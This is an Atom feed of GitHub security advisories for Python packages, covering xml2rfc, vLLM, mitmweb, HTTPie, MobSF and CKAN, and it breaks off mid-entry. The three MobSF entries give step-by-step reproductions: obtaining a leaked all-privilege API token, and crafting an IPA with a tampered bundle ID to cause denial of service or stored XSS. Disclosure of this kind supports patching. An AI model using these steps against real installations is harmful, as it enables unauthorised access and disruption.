<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-02-08T18:01:28.503Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[xml2rfc] xml2rfc has file inclusion irregularities]]></title>
        <id>https://github.com/advisories/GHSA-432c-wxpg-m4q3</id>
        <link href="https://github.com/advisories/GHSA-432c-wxpg-m4q3"/>
        <updated>2025-02-07T20:33:50.000Z</updated>
        <content type="html"><![CDATA[<p>Version <a href="https://github.com/ietf-tools/xml2rfc/blob/main/CHANGELOG.md#3120---2021-12-08">3.12.0</a> changed <code>xml2rfc</code> so that it would not access local files without the presence of its new <code>--allow-local-file-access</code> flag.
This prevented XML External Entity (XXE) injection attacks with <code>xinclude</code> and XML entity references.</p>
<p>It was discovered that <code>xml2rfc</code> does not respect <code>--allow-local-file-access</code> when a local file is specified as <code>src</code> in <code>artwork</code> or <code>sourcecode</code> elements. Furthermore, XML entity references can include any file inside the source dir and below without using the <code>--allow-local-file-access</code> flag. </p>
<p>The <code>xml2rfc &lt;= 3.26.0</code> behaviour:</p>
<table>
<thead>
<tr>
<th></th>
<th><code>xinclude</code></th>
<th>XML entity reference</th>
<th><code>artwork src=</code></th>
<th><code>sourcecode src=</code></th>
</tr>
</thead>
<tbody><tr>
<td>without <code>--allow-local-file-access</code> flag</td>
<td>No filesystem access</td>
<td>Any file in xml2rfc templates dir and below, any file in source directory and below</td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
<tr>
<td>with <code>--allow-local-file-access</code> flag</td>
<td>Access any file on filesystem[^1]</td>
<td>Access any file on filesystem[^1]</td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
</tbody></table>
<p>  [^1]: Access any file of the filesystem with the permissions of the user running <code>xml2rfc</code> can access.</p>
<h3 id="impact">Impact</h3>
<p>Anyone running <code>xml2rfc</code> as a service that accepts input from external users is impacted by this issue.
Specifying a file in <code>src</code> attribute in <code>artwork</code> or <code>sourcecode</code> elements will cause the contents of that file to appear in xml2rfcâ€™s output results.
But that file has to be inside the same directory as the XML input source file.
For <code>artwork</code> and <code>sourcecode</code>, <code>xml2rfc</code> will not look above the source file directory.</p>
<h3 id="the-proposed-new-behaviour">The proposed new behaviour</h3>
<ul>
<li>Generalize file access checks.</li>
<li>Only allow access to files within src dir and below. (xml entity include can access templates dir).</li>
<li>Always allow access to <code>templates_dir</code> for XML entity includes.</li>
</ul>
<p>New behaviour:</p>
<table>
<thead>
<tr>
<th></th>
<th><code>xinclude</code></th>
<th>XML entity reference</th>
<th><code>artwork src=</code></th>
<th><code>sourcecode src=</code></th>
</tr>
</thead>
<tbody><tr>
<td>without <code>--allow-local-file-access</code> flag</td>
<td>No filesystem access</td>
<td>No filesystem access <em>(except for <code>templates_dir</code>)</em></td>
<td>No filesystem access</td>
<td>No filesystem access</td>
</tr>
<tr>
<td>with <code>--allow-local-file-access</code> flag</td>
<td>Access source directory and below</td>
<td>Access source directory and below <em>(Can access<code>templates_dir</code>).</em></td>
<td>Access source directory and below</td>
<td>Access source directory and below</td>
</tr>
</tbody></table>
<h3 id="workarounds">Workarounds</h3>
<p>Use a secure temporary directory to process un-trusted XML files, and do not reuse it for processing other XML documents.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3">https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3</a></li>
<li><a href="https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4">https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4</a></li>
<li><a href="https://github.com/advisories/GHSA-432c-wxpg-m4q3">https://github.com/advisories/GHSA-432c-wxpg-m4q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-432c-wxpg-m4q3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-07T20:32:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM uses Python 3.12 built-in hash() which leads to predictable hash collisions in prefix cache]]></title>
        <id>https://github.com/advisories/GHSA-rm76-4mrf-v9r8</id>
        <link href="https://github.com/advisories/GHSA-rm76-4mrf-v9r8"/>
        <updated>2025-02-06T20:00:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Maliciously constructed statements can lead to hash collisions, resulting in cache reuse, which can interfere with subsequent responses and cause unintended behavior.</p>
<h3 id="details">Details</h3>
<p>Prefix caching makes use of Python's built-in hash() function. As of Python 3.12, the behavior of hash(None) has changed to be a predictable constant value. This makes it more feasible that someone could try exploit hash collisions.</p>
<h3 id="impact">Impact</h3>
<p>The impact of a collision would be using cache that was generated using different content. Given knowledge of prompts in use and predictable hashing behavior, someone could intentionally populate the cache using a prompt known to collide with another prompt in use. </p>
<h3 id="solution">Solution</h3>
<p>We address this problem by initializing hashes in vllm with a value that is no longer constant and predictable. It will be different each time vllm runs. This restores behavior we got in Python versions prior to 3.12.</p>
<p>Using a hashing algorithm that is less prone to collision (like sha256, for example) would be the best way to avoid the possibility of a collision. However, it would have an impact to both performance and memory footprint. Hash collisions may still occur, though they are no longer straight forward to predict.</p>
<p>To give an idea of the likelihood of a collision, for randomly generated hash values (assuming the hash generation built into Python is uniformly distributed), with a cache capacity of 50,000 messages and an average prompt length of 300, a collision will occur on average once every 1 trillion requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/pull/12621">https://github.com/vllm-project/vllm/pull/12621</a></li>
<li><a href="https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7">https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7</a></li>
<li><a href="https://github.com/python/cpython/pull/99541">https://github.com/python/cpython/pull/99541</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8">https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8</a></li>
<li><a href="https://github.com/python/cpython/pull/99541">https://github.com/python/cpython/pull/99541</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/12621">https://github.com/vllm-project/vllm/pull/12621</a></li>
<li><a href="https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7">https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f">https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f</a></li>
<li><a href="https://github.com/advisories/GHSA-rm76-4mrf-v9r8">https://github.com/advisories/GHSA-rm76-4mrf-v9r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rm76-4mrf-v9r8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-06T20:00:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mitmproxy] Mitmweb API Authentication Bypass Using Proxy Server]]></title>
        <id>https://github.com/advisories/GHSA-wg33-5h85-7q5p</id>
        <link href="https://github.com/advisories/GHSA-wg33-5h85-7q5p"/>
        <updated>2025-02-06T19:55:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In mitmweb 11.1.0 and below, a malicious client can use mitmweb's proxy server (bound to <code>*:8080</code> by default) to access mitmweb's internal API (bound to <code>127.0.0.1:8081</code> by default). In other words, while the client cannot access the API directly (good), they can access the API through the proxy (bad). An attacker may be able to escalate this <a href="https://en.wikipedia.org/wiki/Server-side_request_forgery">SSRF</a>-style access to remote code execution.</p>
<p>The mitmproxy and mitmdump tools are unaffected. Only mitmweb is affected. The <code>block_global</code> option, which is enabled by default, blocks connections originating from publicly-routable IP addresses in the proxy. The attacker needs to be in the same local network.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in mitmproxy 11.1.2 and above.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>We thank Stefan GrÃ¶nke (@gronke) for reporting this vulnerability as part of a security audit by <a href="https://www.radicallyopensecurity.com/">Radically Open Security</a>. This audit was supported by the <a href="https://nlnet.nl/entrust/">NGI0 Entrust fund</a> established by <a href="https://nlnet.nl/">NLnet</a>.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li><strong>2025-01-14</strong>: Received initial report. </li>
<li><strong>2025-01-14</strong>: Verified report and confirmed receipt.</li>
<li><strong>2025-01-19</strong>: Shared patch with researcher.</li>
<li><strong>2025-02-04</strong>: Received final confirmation that patch is working.</li>
<li><strong>2025-02-05</strong>: Published patched release and advisory.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p">https://github.com/mitmproxy/mitmproxy/security/advisories/GHSA-wg33-5h85-7q5p</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a">https://github.com/mitmproxy/mitmproxy/commit/fa89055e196d953f11fd241e36ee37858993486a</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md">https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23217">https://nvd.nist.gov/vuln/detail/CVE-2025-23217</a></li>
<li><a href="https://en.wikipedia.org/wiki/Server-side_request_forgery">https://en.wikipedia.org/wiki/Server-side_request_forgery</a></li>
<li><a href="https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112">https://github.com/mitmproxy/mitmproxy/blob/main/CHANGELOG.md#06-february-2025-mitmproxy-1112</a></li>
<li><a href="https://github.com/advisories/GHSA-wg33-5h85-7q5p">https://github.com/advisories/GHSA-wg33-5h85-7q5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wg33-5h85-7q5p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T17:07:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[httpie] HTTPie allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack]]></title>
        <id>https://github.com/advisories/GHSA-8r96-8889-qg2x</id>
        <link href="https://github.com/advisories/GHSA-8r96-8889-qg2x"/>
        <updated>2025-02-06T16:05:10.000Z</updated>
        <content type="html"><![CDATA[<p>Missing SSL certificate validation in HTTPie v3.2.2 allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48052">https://nvd.nist.gov/vuln/detail/CVE-2023-48052</a></li>
<li><a href="https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md">https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md</a></li>
<li><a href="https://github.com/httpie/cli/blob/master/httpie/client.py#L33">https://github.com/httpie/cli/blob/master/httpie/client.py#L33</a></li>
<li><a href="https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44">https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/httpie/PYSEC-2023-242.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/httpie/PYSEC-2023-242.yaml</a></li>
<li><a href="https://github.com/httpie/cli/issues/1549">https://github.com/httpie/cli/issues/1549</a></li>
<li><a href="https://github.com/httpie/cli/commit/7f03c52d2237440c5a672296ce6955aae4ed4f09">https://github.com/httpie/cli/commit/7f03c52d2237440c5a672296ce6955aae4ed4f09</a></li>
<li><a href="https://github.com/advisories/GHSA-8r96-8889-qg2x">https://github.com/advisories/GHSA-8r96-8889-qg2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r96-8889-qg2x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-16T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] MobSF Local Privilege Escalation]]></title>
        <id>https://github.com/advisories/GHSA-79f6-p65j-3m2m</id>
        <link href="https://github.com/advisories/GHSA-79f6-p65j-3m2m"/>
        <updated>2025-02-05T21:45:41.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Product:</strong> Mobile Security Framework (MobSF)
<strong>Version:</strong> 4.3.0
<strong>CWE-ID:</strong> CWE-269: Improper Privilege Management
<strong>CVSS vector v.4.0:</strong> 7.1 (AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N)
<strong>CVSS vector v.3.1:</strong> 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
<strong>Description:</strong> MobSF has a functionality of dividing users by roles. This functionality is not efficient, because any registered user can get API Token with all privileges.
<strong>Impact:</strong> Information Disclosure 
<strong>Vulnerable component:</strong> Code output component (<code>/source_code</code>)
<strong>Exploitation conditions:</strong> authorized user
<strong>Mitigation:</strong> Remove token output in the returned js-script
<strong>Researcher:</strong> Egor Filatov (Positive Technologies)</p>
<h2 id="research">Research</h2>
<p>Researcher discovered zero-day vulnerability Â«Local Privilege EscalationÂ» in Mobile Security Framework (MobSF).
To reproduce the vulnerability follow the steps below.</p>
<p>â€¢	 A user with minimal privileges is required, so the administrator must create a user account</p>
<img src="https://github.com/user-attachments/assets/43e02a50-bdd9-48d9-9194-73946fcc56d9" alt="fig1" width="215">

<p><em>Figure 1. Registration</em></p>
<p>â€¢	Go to static analysis of any application</p>
<img src="https://github.com/user-attachments/assets/9ed141a7-a667-4a96-81fd-d81127874104" alt="fig2" width="1207">
 
<p><em>Figure 2. Static analysis</em></p>
<p>â€¢	Go to the code review of the selected application and get a token with all privileges in the response</p>
<img src="https://github.com/user-attachments/assets/bf8b704b-9067-4861-a7d3-05ec119d9a3f" alt="fig3" width="1400">
 
<p><em>Figure 3. Token receiving</em></p>
<p>â€¢	This token can be used to retrieve dynamic analysis information that has not been accessed before.</p>
<p><img alt="fig4" src="https://github.com/user-attachments/assets/fda8436b-de67-45b1-bb21-6cfbc9976f79"></p>
<p><em>Figure 4. No access demonstration</em></p>
<img src="https://github.com/user-attachments/assets/dc8f639f-36b0-47d3-807d-58ae551fcbfc" alt="fig5" width="1412">
 
<p><em>Figure 5. Token usage</em></p>
<p>As a result, the user is able to escalate the privileges.</p>
<hr>
<h3 id="please-assign-all-credits-to-egor-filatov-positive-technologies">Please, assign all credits to: Egor Filatov (Positive Technologies)</h3>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24805">https://nvd.nist.gov/vuln/detail/CVE-2025-24805</a></li>
<li><a href="https://github.com/advisories/GHSA-79f6-p65j-3m2m">https://github.com/advisories/GHSA-79f6-p65j-3m2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79f6-p65j-3m2m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-05T21:14:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] MobSF Partial Denial of Service (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-jrm8-xgf3-fwqr</id>
        <link href="https://github.com/advisories/GHSA-jrm8-xgf3-fwqr"/>
        <updated>2025-02-05T21:45:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="partial-denial-of-service-dos">Partial Denial of Service (DoS)</h1>
<p><strong>Product:</strong> MobSF
<strong>Version:</strong> &lt; 4.3.1
<strong>CWE-ID:</strong> CWE-1287: Improper Validation of Specified Type of Input
<strong>CVSS vector v.4.0:</strong> 7.1 (AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N)
<strong>CVSS vector v.3.1:</strong> 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)
<strong>Description:</strong>  DoS in the Scans Results and iOS Dynamic Analyzer functionality 
<strong>Impact:</strong> Leveraging this vulnerability would make Scans Results and iOS Dynamic Analyzer pages unavailable.
<strong>Vulnerable component:</strong> urls.py
<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401</a>
<strong>Exploitation conditions:</strong> A malicious application was uploaded to the MobSF.
<strong>Mitigation:</strong> Check the uploaded bundle IDs against the regex.
<strong>Researcher: Oleg Surnin (Positive Technologies)</strong></p>
<h2 id="research">Research</h2>
<p>Researcher discovered zero-day vulnerability Partial Denial of Service (DoS) in MobSF in the Scans Results and iOS Dynamic Analyzer functionality.
According to Apple's documentation for bundle ID's, it must contain only alphanumeric characters (Aâ€“Z, aâ€“z, and 0â€“9), hyphens (-), and periods (.).
(<a href="https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier">https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a>)
However, an attacker can manually modify this value in <code>Info.plist</code> file and add special characters to the <code>&lt;key&gt;CFBundleIdentifier&lt;/key&gt;</code> value.
In the <code>urls.py</code> file URL rules are defined.
<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401</a></p>
<p><em>Listing 3.</em></p>
<pre><code>bundle_id_regex = r'(?P&lt;bundle_id&gt;([a-zA-Z0-9]{1}[\w.-]{1,255}))$'

# skip code
re_path(fr'^ios/view_report/{bundle_id_regex}',
                ios_view_report.Ã§,
                name='ios_view_report'),
</code></pre>
<p>When the application parses the wrong characters in the bundle ID, it encounters an error.
As a result, it will not display content and will throw a 500 error instead. The only way to make the pages work again is to manually remove the malicious application from the system.</p>
<h2 id="vulnerability-reproduction">Vulnerability reproduction</h2>
<p>To reproduce the vulnerability, follow the steps described below.</p>
<p>â€¢	Unzip the IPA file of any iOS application.</p>
<p><em>Listing 4. Unzipping the file</em></p>
<pre><code>unzip test.ipa
</code></pre>
<p>â€¢	Modify the value of <code>&lt;key&gt;CFBundleIdentifier&lt;/key&gt;</code> by adding restricted characters in the <code>Info.plist</code> file.</p>
<img src="https://github.com/user-attachments/assets/97dce68a-a5e2-4048-b5c8-3090146a9635" alt="image-6" width="364">

<p>*Figure 7. Example with <code>'</code> character`</p>
<p>â€¢	Zip the modified IPA file.</p>
<p><em>Listing 5. Zipping the file</em></p>
<pre><code>zip -r dos.ipa Payload/
</code></pre>
<p>â€¢	Upload the modified IPA file to Static Analysis and wait until it finished
â€¢	Open the following pages:
<code>http://mobsf/recent_scans/</code>
<code>http://mobsf/ios/dynamic_analysis/</code></p>
<img src="https://github.com/user-attachments/assets/a7a9ae2e-cd84-4ec8-8132-25140a209ca0" alt="image-7" width="1119">

<p><em>Figure 8. DoS Example</em></p>
<img src="https://github.com/user-attachments/assets/a76e03ae-b4c6-4003-a145-c1fa4c88a7a5" alt="image-8" width="1141">
 
<p><em>Figure 9. DoS Example</em></p>
<hr>
<h3 id="please-assign-all-credits-to-oleg-surnin-positive-technologies">Please, assign all credits to Oleg Surnin (Positive Technologies)</h3>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-jrm8-xgf3-fwqr">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-jrm8-xgf3-fwqr</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li>
<li><a href="https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier">https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24804">https://nvd.nist.gov/vuln/detail/CVE-2025-24804</a></li>
<li><a href="https://github.com/advisories/GHSA-jrm8-xgf3-fwqr">https://github.com/advisories/GHSA-jrm8-xgf3-fwqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrm8-xgf3-fwqr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-05T21:09:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] MobSF Stored Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-cxqq-w3x5-7ph3</id>
        <link href="https://github.com/advisories/GHSA-cxqq-w3x5-7ph3"/>
        <updated>2025-02-05T21:45:23.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Product:</strong> MobSF
<strong>Version:</strong> &lt; 4.3.1
<strong>CWE-ID:</strong> CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.4.0:</strong> 8.5 (AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N)
<strong>CVSS vector v.3.1:</strong> 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
<strong>Description:</strong> Stored XSS in the iOS Dynamic Analyzer functionality.
<strong>Impact:</strong> Leveraging this vulnerability would enable performing actions as users, including administrative users.
<strong>Vulnerable component:</strong> <code>dynamic_analysis.html</code> 
<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406</a>
<strong>Exploitation conditions:</strong> A malicious application was uploaded to the Correlium.
<strong>Mitigation:</strong> Use <code>escapeHtml()</code> function on the <code>bundle</code> variable.
<strong>Researcher: Oleg Surnin (Positive Technologies)</strong></p>
<h2 id="research">Research</h2>
<p>Researcher discovered zero-day vulnerability Stored Cross-site Scripting (XSS) in MobSF in iOS Dynamic Analyzer functionality.
According to Apple's documentation for bundle ID's, it must contain only alphanumeric characters (Aâ€“Z, aâ€“z, and 0â€“9), hyphens (-), and periods (.).
(<a href="https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier">https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a>)
However, an attacker can manually modify this value in <code>Info.plist</code> file and add special characters to the <code>&lt;key&gt;CFBundleIdentifier&lt;/key&gt;</code> value.
In the <code>dynamic_analysis.html</code> file you do not sanitize received bundle value from Corellium 
<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406</a></p>
<img src="https://github.com/user-attachments/assets/8400f872-46c0-406c-9dd6-97655e499b75" alt="image" width="1581">

<p><em>Figure 1. Unsanitized bundle</em></p>
<p>As a result, it is possible to break the HTML context and achieve Stored XSS.</p>
<h2 id="vulnerability-reproduction">Vulnerability reproduction</h2>
<p>To reproduce the vulnerability, follow the steps described below.</p>
<p>â€¢	Unzip the IPA file of any iOS application.
<em>Listing 1. Unzipping the file</em></p>
<pre><code>unzip test.ipa
</code></pre>
<p>â€¢	Modify the value of <code>&lt;key&gt;CFBundleIdentifier&lt;/key&gt;</code> by adding restricted characters in the <code>Info.plist</code> file.</p>
<img src="https://github.com/user-attachments/assets/3eedf216-45ab-4d73-9815-6b02827d36d4" alt="image-1" width="560">

<p><em>Figure 2. Example of the modified Bundle Identifier</em></p>
<p>â€¢	Zip the modified IPA file.</p>
<p><em>Listing 2. Zipping the file</em></p>
<pre><code>zip -r xss.ipa Payload/
</code></pre>
<p>â€¢	Upload the modified IPA file to your virtual device using the Correlium platform.</p>
<img src="https://github.com/user-attachments/assets/7f3e8b0d-d1f9-4d86-b63b-9b3f9e8f1d0c" alt="image-2" width="762">

<p><em>Figure 3. Example of the uploaded malicious application</em></p>
<p>â€¢	Open the XSS functionality and hover the mouse over the Uninstall button of the malicious app.</p>
<img src="https://github.com/user-attachments/assets/fd621574-f2c1-42be-b30a-e8e7445c6b13" alt="image-3" width="764">

<p><em>Figure 4. Example of the 'Uninstall' button</em></p>
 <img src="https://github.com/user-attachments/assets/73526f71-6d39-4a94-98bf-8a867aa9acc7" alt="image-4" width="652">
 
<p><em>Figure 5. Example of the XSS</em></p>
<img src="https://github.com/user-attachments/assets/13e6a1fc-59be-492d-8e42-a5a8010fc4c3" alt="image-5" width="460">

<p><em>Figure 6. Example of the vulnerable code</em></p>
<hr>
<h3 id="please-assign-all-credits-to-oleg-surnin-positive-technologies">Please, assign all credits to: Oleg Surnin (Positive Technologies)</h3>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-cxqq-w3x5-7ph3">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-cxqq-w3x5-7ph3</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li>
<li><a href="https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier">https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406">https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24803">https://nvd.nist.gov/vuln/detail/CVE-2025-24803</a></li>
<li><a href="https://github.com/advisories/GHSA-cxqq-w3x5-7ph3">https://github.com/advisories/GHSA-cxqq-w3x5-7ph3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxqq-w3x5-7ph3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-05T20:56:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckan] CKAN has an XSS vector in user uploaded images in group/org and user profiles]]></title>
        <id>https://github.com/advisories/GHSA-7pq5-qcp6-mcww</id>
        <link href="https://github.com/advisories/GHSA-7pq5-qcp6-mcww"/>
        <updated>2025-02-05T21:45:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using a specially crafted file, a user could potentially upload a file containing code that when executed could send arbitrary requests to the server. If that file was opened by an administrator, it could lead to escalation of privileges of the original submitter or other malicious actions. Users must have been registered to the site to exploit this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in CKAN 2.10.7 and 2.11.2</p>
<h3 id="workarounds">Workarounds</h3>
